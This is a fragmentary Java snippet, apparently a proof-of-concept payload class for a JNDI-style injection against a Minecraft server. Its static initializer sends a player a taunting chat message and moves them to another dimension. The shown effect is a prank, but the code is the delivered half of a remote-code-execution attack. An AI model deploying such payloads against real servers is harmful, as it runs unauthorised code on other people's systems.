...
public class WinTheGame implements ObjectFactory {
    static {
        Callable submitToMain = () -> {
            ...
            if (me != null) {
                me.connection.sendPacket(new SPacketChat(new TextComponentString("\u00a75\u00a7k-|-\u00a74\u00a7l\u00a7nYOU'RE NOT IN KANSAS ANYMORE...\u00a75\u00a7k-|-"), ChatType.SYSTEM));
                me.changeDimension(1);
                me.changeDimension(1);
            }
